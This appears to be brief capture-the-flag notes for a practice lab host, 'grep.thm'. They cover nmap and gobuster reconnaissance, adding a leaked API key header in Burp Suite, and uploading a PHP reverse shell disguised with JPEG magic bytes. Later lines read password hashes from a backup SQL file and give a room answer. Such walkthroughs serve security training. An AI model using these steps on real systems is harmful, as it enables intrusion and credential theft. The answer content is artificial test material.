A challenge that tests your reconnaissance and OSINT skills.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden

51337/tcp open  http     Apache httpd 2.4.41
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.41 (Ubuntu)

add <machine-ip> hosts file

capture request to register using burp suite

send it to repeater

searching online for searchME cms

github repo: https://github.com/supersecuredeveloper/searchmecms

with api in history

edit the burp suite request  X-THM-API-Key header

first flag after registering and logging in

```
gobuster dir -u https://grep.thm/public/html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --no-error -x php,hs,html -k
```

exposed upload.php

```
gobuster dir -u https://grep.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t64 --no-error -k
```
The GitHub repo code shows that it checks for file types

```
$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];
```
modify the file from (top row shown)
```
00000000   3C 3F 70 68  70 0A 2F 2F  20 70 68 70  2D 72 65 76  < ?php.// php-rev
```
to
```
00000000 ff d8 ff e0 00 00 00 
```
upload

start listen

stabilize shell

cat /var/ww/backup/users.sql

admin email and password hash

INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

domain for checking leak: 
```
What is the host name of the web application that allows a user to check an email for a possible password leak?

leakchecker.grep.thm
```